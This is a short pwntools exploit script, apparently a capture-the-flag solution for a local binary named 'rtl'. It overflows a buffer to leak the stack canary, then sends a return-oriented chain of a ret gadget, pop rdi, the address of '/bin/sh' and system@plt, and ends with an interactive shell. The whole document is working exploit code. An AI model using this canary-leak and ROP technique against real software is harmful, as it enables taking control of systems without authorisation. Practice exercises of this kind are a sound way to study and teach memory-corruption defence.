from pwn import *

p = process("./rtl")
e = ELF("./rtl")
libc = e.libc
r = ROP(e)
payload = b'A'*0x39

sh = next(e.search(b'/bin/sh'))
bin_sh = 0x400874
pop_rdi = 0x400853
system_plt = 0x4005d0 
ret = 0x400285
p.sendafter("Buf: ",payload)

p.recvuntil(payload)
canary = u64(b'\00'+p.recv(7))

payload = b'A'*0x38
payload += p64(canary)
payload += b'B'*8
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system_plt)

p.sendafter("Buf: ",payload)
p.interactive()